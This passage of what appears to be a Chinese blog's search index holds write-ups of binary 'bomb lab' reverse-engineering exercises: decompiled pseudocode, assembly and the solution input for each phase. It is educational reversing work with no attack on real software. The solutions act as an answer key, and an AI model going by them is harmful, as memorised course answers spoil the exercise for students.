case 7 : v7 = 0 ; break ; default : explode_bomb (); return result ; } result = v7 - 317 ; if ( v9 > 5 || result != v10 ) //\u5c0f\u4e8e\u7b49\u4e8e5\u4e14result\u5fc5\u987b\u7b49\u4e8ev10 explode_bomb (); return result ; } \u7136\u540e\u8d70\u4e00\u4e2acase\u5c31\u884c","title":"\u7b2c\u4e09\u5173"},{"location":"reverse/bomb-whu/#_4","text":"\u5173\u952e\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 int __cdecl phase_4 ( int a1 ) { int result ; // eax@4 int v2 ; // [sp+18h] [bp-14h]@1 int v3 ; // [sp+1Ch] [bp-10h]@1 if ( __isoc99_sscanf ( a1 , \"%d %d\" , & v3 , & v2 ) != 2 || ( unsigned int )( v2 - 2 ) > 2 ) explode_bomb (); //\u5fc5\u987b\u662f2\u4e2a\u53c2\u6570\u4e14v2-2 <= 2 result = func4 ( 5 , v2 ); if ( result != v3 ) //result\u5fc5\u987b\u4e3av3\uff0c\u4e5f\u5c31\u662f\u8bf4\u4f20\u5165\u4e00\u4e2av2\u8ba1\u7b97\u51fa\u6765\u7684\u503c\u8981\u548cv3\u76f8\u7b49 explode_bomb (); return result ; } \u5206\u6790\u4e00\u4e0b func4 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 int __cdecl func4 ( int a1 , int a2 ) //a2\u662f\u53ef\u4ee5\u63a7\u5236\u7684\u53c2\u6570 { int result ; // eax@2 int v3 ; // edi@3 if ( a1 <= 0 ) { result = 0 ; } else { result = a2 ; if ( a1 != 1 ) { v3 = func4 ( a1 - 1 , a2 ) + a2 ; result = v3 + func4 ( a1 - 2 , a2 ); } } return result ; } \u6ce8\u610f\u6b64\u5904 (unsigned int)(v2 - 2) > 2 \u662f\u65e0\u7b26\u53f7\u6570\u6bd4\u8f83\uff0c\u8d1f\u6570\u4f1a\u53d8\u6210\u5f88\u5927\u7684\u6570\u5b57 \u8f93\u516536 \u548c 3\u5373\u53ef","title":"\u7b2c\u56db\u5173"},{"location":"reverse/bomb-whu/#_5","text":"\u8f93\u5165 beldog \u5373\u53ef","title":"\u7b2c\u4e94\u5173"},{"location":"reverse/bomb-whu/#_6","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 int __cdecl phase_6 ( int a1 ) { signed int v1 ; // esi@1 int v2 ; // ebx@5 signed int v3 ; // ebx@6 _DWORD * v4 ; // edx@11 signed int v5 ; // eax@11 int v6 ; // ecx@15 int v7 ; // ebx@17 char * v8 ; // eax@17 int i ; // ecx@17 int v10 ; // edx@18 signed int v11 ; // esi@20 int result ; // eax@21 int v13 ; // [sp+Ch] [bp-40h]@7 int v14 [ 6 ]; // [sp+10h] [bp-3Ch]@1 int v15 ; // [sp+28h] [bp-24h]@14 char v16 ; // [sp+2Ch] [bp-20h]@17 char v17 ; // [sp+40h] [bp-Ch]@18 read_six_numbers ( a1 , v14 ); v1 = 0 ; while ( 1 ) { if ( ( unsigned int )( v14 [ v1 ] - 1 ) > 5 ) explode_bomb (); if ( ++ v1 == 6 ) break ; v3 = v1 ; do { if ( * ( & v13 + v1 ) == v14 [ v3 ] ) explode_bomb (); ++ v3 ; } while ( v3 <= 5 ); } v2 = 0 ; do { v6 = v14 [ v2 ]; if ( v6 <= 1 ) { v4 = & node1 ; } else { v5 = 1 ; v4 = & node1 ; do { v4 = ( _DWORD * ) v4 [ 2 ]; ++ v5 ; } while ( v5 != v6 ); } * ( & v15 + v2 ++ ) = ( int ) v4 ; } while ( v2 != 6 ); v7 = v15 ; v8 = & v16 ; for ( i = v15 ; ; i = v10 ) { v10 = * ( _DWORD * ) v8 ; * ( _DWORD * )( i + 8 ) = * ( _DWORD * ) v8 ; v8 += 4 ; if ( v8 == & v17 ) break ; } * ( _DWORD * )( v10 + 8 ) = 0 ; v11 = 5 ; do { result = ** ( _DWORD ** )( v7 + 8 ); if ( * ( _DWORD * ) v7 > result ) explode_bomb (); v7 = * ( _DWORD * )( v7 + 8 ); -- v11 ; } while ( v11 ); return result ; } \u8f93\u5165 1 2 3 4 5 6\u5b58\u5165\u7684\u6570\u636e \u5b66\u4e60\u4e00\u4e0b\uff0c\u6b64\u65f6\u53ef\u4ee5\u901a\u8fc7esi\u5bc4\u5b58\u5668\u8fdb\u884c\u53d8\u5740\u5bfb\u5740 \u7b2c\u4e00\u4e2a\u5faa\u73af\u7684v13\u8fd9\u4e2a\u53d8\u91cf\u5f88\u795e\u5947\uff0c\u4e4b\u524d\u6839\u672c\u6ca1\u5b9a\u4e49\u554a\uff0c\u81ea\u5df1\u8c03\u8bd5\u6765\u770b\u4e00\u4e0b \u7136\u540e\u5c06\u6570\u636e\u5b58\u5165 \u800c\u6b64\u65f6 \u90a3\u5927\u6982\u5c31\u662f\u53d6\u4e4b\u524d\u7684\u90a3\u4e2a\u6570\u5b57\u4e86\u4e8e\u662f\u8fd9\u6bb5\u4ee3\u7801\u7684\u542b\u4e49\uff1a 1 \u5c31\u662f\u6bcf\u4e2a\u6570\u5fc5\u987b\u90fd\u5c0f\u4e8e6\u5e76\u4e14\u4e92\u4e0d\u76f8\u7b49 \u63a5\u4e0b\u6765\u770b\u4e0b\u4e00\u4e2a\u5faa\u73af 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 v2 = 0 ; do { v6 = v14 [ v2 ]; //\u53d6\u51fav14\u6570\u7ec4\u7b2cv2\u4e2a\u76f8\u5f53\u4e8e\u904d\u5386\u6570\u7ec4 if ( v6 <= 1 ) { v4 = & node1 ; } else { v5 = 1 ; v4 = & node1 ; do { v4 = ( _DWORD * ) v4 [ 2 ]; //\u6307\u9488+2\uff0cv4\u5728\u4e0d\u65ad\u5730\u53d8\u5316 ++ v5 ; } while ( v5 != v6 ); } * ( & v15 + v2 ++ ) = ( int ) v4 ; //v15\u53c8\u6ca1\u6709\u5b9a\u4e49 } while ( v2 != 6 ); //\u8fdb\u884c6\u6b21\u5faa\u73af \u4e0b\u4e00\u4e2a\u5faa\u73af 1 2 3 4 5 6 7 8 9 10 v7 = v15 ; v8 = & v16 ; for ( i = v15 ; ; i = v10 ) { v10 = * ( _DWORD * ) v8 ; * ( _DWORD * )( i + 8 ) = * ( _DWORD * ) v8 ; v8 += 4 ; if ( v8 == & v17 ) break ; } \u6b64\u65f6\u770b\u5230edx\u7684\u503c \u91cd\u70b9\u662f\u8fd9\u4e2a\u6bd4\u8f83","title":"\u7b2c\u516d\u5173"},{"location":"reverse/bomb-whu/#_7","text":"","title":"\u53c2\u8003"},{"location":"reverse/bomb/","text":"bomb\u6e38\u620f \u00b6 \u4e0b\u8f7d\u94fe\u63a5 \u5f88\u6709\u610f\u601d\u7684\u4e00\u4e2a\u6e38\u620f\uff0c\u8fd9\u91cc\u7528\u5230\u4e86\u4e00\u4e2a\u6211\u4e0d\u662f\u5f88\u719f\u6089\u7684\u51fd\u6570 sscanf \u51fd\u6570\u539f\u578b\u5982\u4e0b\uff1a 1 int sscanf ( string str , string fmt , mixed var1 , mixed var2 ... ); \u5176\u5b9e\u5c31\u662f\u628a\u8f93\u5165\u7684\u6570\u636e\u6309\u7167\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5b58\u50a8\u5230\u4e0d\u540c\u7684\u53d8\u91cf\u4e2d \u7b2c\u4e00\u5173 \u00b6 1 2 3 4 5 6 7 8 9 int __fastcall phase_1 ( __int64 a1 ) { int result ; // eax@1 result = strings_not_equal ( a1 , \"Border relations with Canada have never been better.\" ); if ( result ) explode_bomb (); return result ; } \u8f93\u5165\u5373\u53ef Border relations with Canada have never been better. \u7b2c\u4e8c\u5173 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 __int64 __fastcall phase_2 ( __int64 a1 ) { __int64 result ; // rax@3 char * v2 ; // rbx@5 int v3 ; // [sp+0h] [bp-38h]@1 char v4 ; // [sp+4h] [bp-34h]@7 char v5 ; // [sp+18h] [bp-20h]@5 read_six_numbers ( a1 , ( __int64 ) & v3 ); if ( v3 != 1 ) explode_bomb (); v2 = & v4 ; do { result = ( unsigned int )( 2 * * (( _DWORD * ) v2 - 1 )); if ( * ( _DWORD * ) v2 != ( _DWORD ) result ) explode_bomb (); v2 += 4 ; } while ( v2 != & v5 ); return result ; } \u8fd8\u662f\u8bfb\u5165\u4e00\u4e2a\u6570\u5b57\uff0c\u8c03\u7528\u4e86\u4e00\u4e2a read_six_numbers \u51fd\u6570 read_six_numbers \u51fd\u6570\u5185\u5bb9\u5982\u4e0b 1 2 3 4 5 6 7 8 9 int __fastcall read_six_numbers ( __int64 a1 , __int64 a2 ) { int result ; // eax@1 result = __isoc99_sscanf ( a1 , & unk_4025C3 , a2 , a2 + 4 , a2 + 8 ); if ( result <= 5 ) explode_bomb (); return result ; } \u5176\u4e2d unk_4025C3 \u7684\u503c\u4e3a\uff1a \u5927\u81f4\u660e\u767d\u4e86 sscanf \u51fd\u6570\u662f\u5e72\u561b\u7684 \u8f93\u5165\u7684\u6570\u636e\u4fdd\u5b58\u5728\uff1a \u91cd\u70b9\u8fd8\u662f\u5728\u8fd9\u6bb5\u53cd\u6c47\u7f16\u7684\u4ee3\u7801: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 .text: 0000000000400 F17 mov eax , [ rbx-4 ] .text: 0000000000400 F1A add eax , eax .text: 0000000000400 F1C cmp [ rbx ], eax .text: 0000000000400 F1E jz short loc_400F25 .text: 0000000000400 F20 call explode_bomb .text: 0000000000400 F25 .text: 0000000000400 F25 loc_400F25 : ; CODE XREF: phase_2+22\u0018j .text : 0000000000400 F25 add rbx , 4 .text: 0000000000400 F29 cmp rbx , rbp .text: 0000000000400 F2C jnz short loc_400F17 .text: 0000000000400 F2E jmp short loc_400F3C .text: 0000000000400 F30 .text: 0000000000400 F30 loc_400F30 : ; CODE XREF: phase_2+12\u0018j .text : 0000000000400 F30 ; phase_2+19\u0018j .text : 0000000000400 F30 lea rbx , [ rsp + 38 h + var_34 ] .text: 0000000000400 F35 lea rbp , [ rsp + 38 h + var_20 ] .text: 0000000000400 F3A jmp short loc_400F17 \u597d\u4e45\u6ca1\u770b\u6c47\u7f16\u4e86\u3002\u770b\u7684\u5934\u5927\u3002 \u8f93\u5165\u7684\u6570\u636e\u7ecf\u8fc7 lea rbx, [rsp+38h+var_34] \u5b58\u653e\u5230\uff1a \u8fd9\u91cc\u662frbp \u903b\u8f91\u5206\u6790\u4e00\u4e0b eax\u4ecerbx\u6307\u5411\u7684\u53d6\u51fa\u4e00\u4e2a\u503c\u6765\uff0c\u7136\u540eeax+eax,\u6bd4\u8f83 \u7b2c\u4e09\u5173 \u00b6 \u5173\u952e\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 signed __int64 __fastcall phase_3(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5) { signed __int64 result; // rax@4 int v6; // [sp+8h] [bp-10h]@1 int v7; // [sp+Ch] [bp-Ch]@1 if ( __isoc99_sscanf(a1, \"%d %d\", &v6, &v7, a5) <= 1 ) explode_bomb(); switch ( v6 ) { case 0: result = 207LL; break; case 2: result = 707LL; break; case 3: result = 256LL; break; case 4: result = 389LL; break; case 5: result = 206LL; break; case 6: result = 682LL; break; case 7: result = 327LL; break; case 1: result = 311LL; break; default: explode_bomb(); return result; } if ( (_DWORD)result != v7 ) explode_bomb(); return result; } \u901a\u8fc7switch\u6765\u5224\u65ad\uff0c\u662f\u6211\u770b\u9519\u4e86\u5417\u8fd9\u4e48\u7b80\u5355\u3002 \u7b2c\u56db\u5173 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 int __fastcall phase_4(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5) { int result; // eax@4 unsigned int v6; // [sp+8h] [bp-10h]@1 int v7; // [sp+Ch] [bp-Ch]@1 if ( __isoc99_sscanf(a1, \"%d %d\", &v6, &v7, a5) != 2 || v6 > 0xE ) explode_bomb(); result = func4(v6, 0LL, 14LL); if ( result || v7 ) explode_bomb(); return result; } \u4ece\u8fd9\u91cc\u770b\u5230 v7 \u5fc5\u987b\u662f0\uff0c\u540c\u65f6\u6211\u4eec\u8981\u8ba9 result \u4e5f\u4e3a0 \u91cd\u70b9\u770b\u4e0b func4 \u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 __int64 __fastcall func4 ( __int64 a1 , __int64 a2 , __int64 a3 ) { signed int v3 ; // ecx@1 __int64 result ; // rax@2 v3 = (( signed int ) a3 - ( signed int ) a2 ) / 2 + a2 ; if ( v3 <= ( signed int ) a1 ) { result = 0LL ; if ( v3 < ( signed int ) a1 ) result = ( unsigned int )( 2 * func4 ( a1 , ( unsigned int )( v3 + 1 ), a3 ) + 1 ); } else { result = ( unsigned int )( 2 * func4 ( a1 , a2 , ( unsigned int )( v3 - 1 ))); } return result ; } \u8fd9\u91cc\u6211\u4eec\u8981\u77e5\u9053\u5f53 a1 \u662f\u4ec0\u4e48\u503c\u7684\u65f6\u5019\u624d\u53ef\u4ee5\u4f7f\u5f97\u7ed3\u679c\u4e3a0 \u76f4\u63a5\u8dd1\u4e00\u4e2a\u5faa\u73af\u5373\u53ef \u4ee3\u7801\u5982\u4e0b\uff1a 1 \u7b2c\u4e94\u5173 \u00b6 \u5173\u952e\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 __int64 __fastcall phase_5 ( __int64 a1 ) { __int64 v1 ; // rax@3 char v3 [ 6 ]; // [sp+10h] [bp-18h]@3 char v4 ; // [sp+16h] [bp-12h]@4 __int64 v5 ; // [sp+18h] [bp-10h]@1 v5 = * MK_FP ( __FS__ , 40LL ); if ( string_length () != 6 ) explode_bomb (); v1 = 0LL ; do { v3 [ v1 ] = array_3449 [( unsigned __int64 )( * ( _BYTE * )( a1 + v1 ) & 0xF )]; ++ v1 ; } while ( v1 != 6 ); v4 = 0 ; if ( strings_not_equal ( v3 , \"flyers\" ) ) explode_bomb (); return * MK_FP ( __FS__ , 40LL ) ^ v5 ; } \u8f93\u5165\u4e86\u4e00\u4e2aabcdefg \u5b58\u50a8\u5728 \u8ba1\u7b97\u957f\u5ea6\u5f97\u52307 \u5c34\u5c2c\u7684\u53d1\u73b0\u6570\u636e\u957f\u5ea6\u4e0d\u5bf9\uff0c\u518d\u6765\u4e00\u6b21\u8f93\u5165abcdef \u6b64\u65f6\u6570\u636e\u5b58\u653e\u5728\u5982\u4e0b\u4f4d\u7f6e \u7ecf\u8fc7\u8fd9\u53e5\u8bdd\u4e4b\u540e\u5c06\u4e00\u4e2a\u5b57\u7b26\u653e\u7f6e\u5230\u8fd9\u91cc \u6b64\u65f6\u4e00\u4e2a\u4e0e\u64cd\u4f5c\uff0c\u8ba9RDX\u7684\u503c\u53d8\u4e3a\u4e861\u5c31\u5f88\u795e\u5947\u4e86\uff0c\u672c\u6765\u662f0x61\u7684 \u597d\u90a3\u6211\u4eec\u7ee7\u7eed\u770b\u4e00\u4e0b\u4e0b\u4e00\u4e2a\u5b57\u7b26b b\u5bf9\u5e94\u7684ASCII\u7801\u662f0x62\uff0c\u7ecf\u8fc7\u4e00\u987f\u4e0e\u64cd\u4f5c\u53d8\u6210\u4e862\uff0c\u5e76\u4e14\u53d6\u51fa\u7684\u662f d \u60ca\u4e86\uff0c\u8fd9\u4e2a\u6570\u7ec4\u5c45\u7136\u4e0d\u662f\u4ece0\u5f00\u59cb\u7684 \u4e8e\u662f\u5c31 \u8fd9\u5e45\u56fe\u5199\u7684\u5f88\u6e05\u695a\u4e86 \u7136\u540e\u8f6c\u6362\u4e00\u4e0b ok\u7b2c\u4e94\u5173\u6210\u4e86 \u7b2c\u516d\u5173 \u00b6 4 3 2 1 6 5 \u5173\u952e\u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 __int64 __fastcall phase_6 ( __int64 a1 ) { int * v1 ; // r13@1 signed int v2 ; // er12@1 signed int v3 ; // ebx@5 char * v4 ; // rax@10 unsigned __int64 v5 ; // rsi@12 _QWORD * v6 ; // rdx@13 signed int v7 ; // eax@13 int v8 ; // ecx@17 __int64 v9 ; // rbx@19 char * v10 ; // rax@19 __int64 i ; // rcx@19 __int64 v12 ; // rdx@20 signed int v13 ; // ebp@22 __int64 result ; // rax@23 int v15 [ 6 ]; // [sp+0h] [bp-78h]@1 char v16 ; // [sp+18h] [bp-60h]@11 __int64 v17 ; // [sp+20h] [bp-58h]@16 char v18 ; // [sp+28h] [bp-50h]@19 char v19 ; // [sp+50h] [bp-28h]@20 v1 = v15 ; read_six_numbers ( a1 , ( __int64 ) v15 ); v2 = 0 ; while ( 1 ) { if ( ( unsigned int )( * v1 - 1 ) > 5 ) explode_bomb (); if ( ++ v2 == 6 ) break ; v3 = v2 ; do { if ( * v1 == v15 [ v3 ] ) explode_bomb (); ++ v3 ; } while ( v3 <= 5 ); ++ v1 ; } v4 = ( char * ) v15 ; do { * ( _DWORD * ) v4 = 7 - * ( _DWORD * ) v4 ; v4 += 4 ; } while ( v4 != & v16 ); v5 = 0LL ; do { v8 = v15 [ v5 / 4 ]; if ( v8 <= 1 ) { v6 = & node1 ; } else { v7 = 1 ; v6 = & node1 ; do { v6 = ( _QWORD * ) v6 [ 1 ]; ++ v7 ; } while ( v7 != v8 ); } * ( __int64 * )(( char * ) & v17 + 2 * v5 ) = ( __int64 ) v6 ; v5 += 4LL ; } while ( v5 != 24 ); v9 = v17 ; v10 = & v18 ; for ( i = v17 ; ; i = v12 ) { v12 = * ( _QWORD * ) v10 ; * ( _QWORD * )( i + 8 ) = * ( _QWORD * ) v10 ; v10 += 8 ; if ( v10 == & v19 ) break ; } * ( _QWORD * )( v12 + 8 ) = 0LL ; v13 = 5 ; do { result = ** ( _DWORD ** )( v9 + 8 ); if ( * ( _DWORD * ) v9 < ( signed int ) result ) explode_bomb (); v9 = * ( _QWORD * )( v9 + 8 ); -- v13 ; } while ( v13 ); return result ; } \u4e00\u4e2a\u4e2a\u5faa\u73af\u6765\u770b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 v1 = v15 ; read_six_numbers ( a1 , ( __int64 ) v15 ); v2 = 0 ; while ( 1 ) { if ( ( unsigned int )( * v1 - 1 ) > 5 ) //\u904d\u5386\u6570\u7ec4\u6bcf\u4e00\u4e2a\u90fd\u5fc5\u987b\u5927\u4e8e6 explode_bomb (); if ( ++ v2 == 6 ) break ; v3 = v2 ; do { if ( * v1 == v15 [ v3 ] ) //\u6bcf\u4e2a\u6570\u90fd\u4e0d\u80fd\u76f8\u7b49 explode_bomb (); ++ v3 ; } while ( v3 <= 5 ); ++ v1 ; } 1 2 3 4 5 6 7 v4 = ( char * ) v15 ; do { * ( _DWORD * ) v4 = 7 - * ( _DWORD * ) v4 ; v4 += 4 ; } while ( v4 != & v16 ); \u5c06\u6808\u4e2d\u76846\u4e2a\u503c\uff08\u5047\u8bbe\u4e3ax\uff09\u53d8\u4e3a7-x\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 v5 = 0LL ; do { v8 = v15 [ v5 / 4 ]; if ( v8 <= 1 ) { v6 = & node1 ; } else { v7 = 1 ; v6 = & node1 ; do { v6 = ( _QWORD * ) v6 [ 1 ]; //\u8fd9\u91cc\u5176\u5b9e\u662f\u4e00\u4e2a\u94fe\u8868\u64cd\u4f5c ++ v7 ; } while ( v7 != v8 ); } * ( __int64 * )(( char * ) & v17 + 2 * v5 ) = ( __int64 ) v6 ; v5 += 4LL ; } while ( v5 != 24 ); rdx\u5904\u4e0b\u65ad\u70b9\uff0c\u770b\u5230\u8fd9\u4e2a\uff1a \u53c2\u8003 \u00b6","title":"bomb\u6e38\u620f"},{"location":"reverse/bomb/#bomb","text":"\u4e0b\u8f7d\u94fe\u63a5 \u5f88\u6709\u610f\u601d\u7684\u4e00\u4e2a\u6e38\u620f\uff0c\u8fd9\u91cc\u7528\u5230\u4e86\u4e00\u4e2a\u6211\u4e0d\u662f\u5f88\u719f\u6089\u7684\u51fd\u6570 sscanf \u51fd\u6570\u539f\u578b\u5982\u4e0b\uff1a 1 int sscanf ( string str , string fmt , mixed var1 , mixed var2 ... ); \u5176\u5b9e\u5c31\u662f\u628a\u8f93\u5165\u7684\u6570\u636e\u6309\u7167\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5b58\u50a8\u5230\u4e0d\u540c\u7684\u53d8\u91cf\u4e2d","title":"bomb\u6e38\u620f"},{"location":"reverse/bomb/#_1","text":"1 2 3 4 5 6 7 8 9 int __fastcall phase_1 ( __int64 a1 ) { int result ; // eax@1 result = strings_not_equal ( a1 , \"Border relations with Canada have never been better.\" ); if ( result ) explode_bomb (); return result ; } \u8f93\u5165\u5373\u53ef Border relations with Canada have never been better.","title":"\u7b2c\u4e00\u5173"},{"location":"reverse/bomb/#_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 __int64 __fastcall phase_2 ( __int64 a1 ) { __int64 result ; // rax@3 char * v2 ; // rbx@5 int v3 ; // [sp+0h] [bp-38h]@1 char v4 ; // [sp+4h] [bp-34h]@7 char v5 ; // [sp+18h] [bp-20h]@5 read_six_numbers ( a1 , ( __int64 ) & v3 ); if ( v3 != 1 ) explode_bomb (); v2 = & v4 ; do { result = ( unsigned int )( 2 * * (( _DWORD * ) v2 - 1 )); if ( * ( _DWORD * ) v2 != ( _DWORD ) result ) explode_bomb (); v2 += 4 ; } while ( v2 != & v5 ); return result ; } \u8fd8\u662f\u8bfb\u5165\u4e00\u4e2a\u6570\u5b57\uff0c\u8c03\u7528\u4e86\u4e00\u4e2a read_six_numbers \u51fd\u6570 read_six_numbers \u51fd\u6570\u5185\u5bb9\u5982\u4e0b 1 2 3 4 5 6 7 8 9 int __fastcall read_six_numbers ( __int64 a1 , __int64 a2 ) { int result ; // eax@1 result = __isoc99_sscanf ( a1 , & unk_4025C3 , a2 , a2 + 4 , a2 + 8 ); if ( result <= 5 ) explode_bomb (); return result ; } \u5176\u4e2d unk_4025C3 \u7684\u503c\u4e3a\uff1a \u5927\u81f4\u660e\u767d\u4e86 sscanf \u51fd\u6570\u662f\u5e72\u561b\u7684 \u8f93\u5165\u7684\u6570\u636e\u4fdd\u5b58\u5728\uff1a \u91cd\u70b9\u8fd8\u662f\u5728\u8fd9\u6bb5\u53cd\u6c47\u7f16\u7684\u4ee3\u7801: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 .text: 0000000000400 F17 mov eax , [ rbx-4 ] .text: 0000000000400 F1A add eax , eax .text: 0000000000400 F1C cmp [ rbx ], eax .text: 0000000000400 F1E jz short loc_400F25 .text: 0000000000400 F20 call explode_bomb .text: 0000000000400 F25 .text: 0000000000400 F25 loc_400F25 : ; CODE XREF: phase_2+22\u0018j .text : 0000000000400 F25 add rbx , 4 .text: 0000000000400 F29 cmp rbx , rbp .text: 0000000000400 F2C jnz short loc_400F17 .text: 0000000000400 F2E jmp short loc_400F3C .text: 0000000000400 F30 .text: 0000000000400 F30 loc_400F30 : ; CODE XREF: phase_2+12\u0018j .text : 0000000000400 F30 ; phase_2+19\u0018j .text : 0000000000400 F30 lea rbx , [ rsp + 38 h + var_34 ] .text: 0000000000400 F35 lea rbp , [ rsp + 38 h + var_20 ] .text: 0000000000400 F3A jmp short loc_400F17 \u597d\u4e45\u6ca1\u770b\u6c47\u7f16\u4e86\u3002\u770b\u7684\u5934\u5927\u3002 \u8f93\u5165\u7684\u6570\u636e\u7ecf\u8fc7 lea rbx, [rsp+38h+var_34] \u5b58\u653e\u5230\uff1a \u8fd9\u91cc\u662frbp \u903b\u8f91\u5206\u6790\u4e00\u4e0b eax\u4ecerbx\u6307\u5411\u7684\u53d6\u51fa\u4e00\u4e2a\u503c\u6765\uff0c\u7136\u540eeax+eax,\u6bd4\u8f83","title":"\u7b2c\u4e8c\u5173"},{"location":"reverse/bomb/#_3","text":"\u5173\u952e\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 signed __int64 __fastcall phase_3(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5) { signed __int64 result; // rax@4 int v6; // [sp+8h] [bp-10h]@1 int v7; // [sp+Ch] [bp-Ch]@1 if ( __isoc99_sscanf(a1, \"%d %d\", &v6, &v7, a5) <= 1 ) explode_bomb(); switch ( v6 ) { case 0: result = 207LL; break; case 2: result = 707LL; break; case 3: result = 256LL; break; case 4: result = 389LL; break; case 5: result = 206LL; break; case 6: result = 682LL; break; case 7: result = 327LL; break; case 1: result = 311LL; break; default: explode_bomb(); return result; } if ( (_DWORD)result != v7 ) explode_bomb(); return result; } \u901a\u8fc7switch\u6765\u5224\u65ad\uff0c\u662f\u6211\u770b\u9519\u4e86\u5417\u8fd9\u4e48\u7b80\u5355\u3002","title":"\u7b2c\u4e09\u5173"},{"location":"reverse/bomb/#_4","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 int __fastcall phase_4(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5) { int result; // eax@4 unsigned int v6; // [sp+8h] [bp-10h]@1 int v7; // [sp+Ch] [bp-Ch]@1 if ( __isoc99_sscanf(a1, \"%d %d\", &v6, &v7, a5) != 2 || v6 > 0xE ) explode_bomb(); result = func4(v6, 0LL, 14LL); if ( result || v7 ) explode_bomb(); return result; } \u4ece\u8fd9\u91cc\u770b\u5230 v7 \u5fc5\u987b\u662f0\uff0c\u540c\u65f6\u6211\u4eec\u8981\u8ba9 result \u4e5f\u4e3a0 \u91cd\u70b9\u770b\u4e0b func4 \u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 __int64 __fastcall func4 ( __int64 a1 , __int64 a2 , __int64 a3 ) { signed int v3 ; // ecx@1 __int64 result ; // rax@2 v3 = (( signed int ) a3 - ( signed int ) a2 ) / 2 + a2 ; if ( v3 <= ( signed int ) a1 ) { result = 0LL ; if ( v3 < ( signed int ) a1 ) result = ( unsigned int )( 2 * func4 ( a1 , ( unsigned int )( v3 + 1 ), a3 ) + 1 ); } else { result = ( unsigned int )( 2 * func4 ( a1 , a2 , ( unsigned int )( v3 - 1 ))); } return result ; } \u8fd9\u91cc\u6211\u4eec\u8981\u77e5\u9053\u5f53 a1 \u662f\u4ec0\u4e48\u503c\u7684\u65f6\u5019\u624d\u53ef\u4ee5\u4f7f\u5f97\u7ed3\u679c\u4e3a0 \u76f4\u63a5\u8dd1\u4e00\u4e2a\u5faa\u73af\u5373\u53ef \u4ee3\u7801\u5982\u4e0b\uff1a 1","title":"\u7b2c\u56db\u5173"},{"location":"reverse/bomb/#_5","text":"\u5173\u952e\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 __int64 __fastcall phase_5 ( __int64 a1 ) { __int64 v1 ; // rax@3 char v3 [ 6 ]; // [sp+10h] [bp-18h]@3 char v4 ; // [sp+16h] [bp-12h]@4 __int64 v5 ; // [sp+18h] [bp-10h]@1 v5 = * MK_FP ( __FS__ , 40LL ); if ( string_length () != 6 ) explode_bomb (); v1 = 0LL ; do { v3 [ v1 ] = array_3449 [( unsigned __int64 )( * ( _BYTE * )( a1 + v1 ) & 0xF )]; ++ v1 ; } while ( v1 != 6 ); v4 = 0 ; if ( strings_not_equal ( v3 , \"flyers\" ) ) explode_bomb (); return * MK_FP ( __FS__ , 40LL ) ^ v5 ; } \u8f93\u5165\u4e86\u4e00\u4e2aabcdefg \u5b58\u50a8\u5728 \u8ba1\u7b97\u957f\u5ea6\u5f97\u52307 \u5c34\u5c2c\u7684\u53d1\u73b0\u6570\u636e\u957f\u5ea6\u4e0d\u5bf9\uff0c\u518d\u6765\u4e00\u6b21\u8f93\u5165abcdef \u6b64\u65f6\u6570\u636e\u5b58\u653e\u5728\u5982\u4e0b\u4f4d\u7f6e \u7ecf\u8fc7\u8fd9\u53e5\u8bdd\u4e4b\u540e\u5c06\u4e00\u4e2a\u5b57\u7b26\u653e\u7f6e\u5230\u8fd9\u91cc \u6b64\u65f6\u4e00\u4e2a\u4e0e\u64cd\u4f5c\uff0c\u8ba9RDX\u7684\u503c\u53d8\u4e3a\u4e861\u5c31\u5f88\u795e\u5947\u4e86\uff0c\u672c\u6765\u662f0x61\u7684 \u597d\u90a3\u6211\u4eec\u7ee7\u7eed\u770b\u4e00\u4e0b\u4e0b\u4e00\u4e2a\u5b57\u7b26b b\u5bf9\u5e94\u7684ASCII\u7801\u662f0x62\uff0c\u7ecf\u8fc7\u4e00\u987f\u4e0e\u64cd\u4f5c\u53d8\u6210\u4e862\uff0c\u5e76\u4e14\u53d6\u51fa\u7684\u662f d 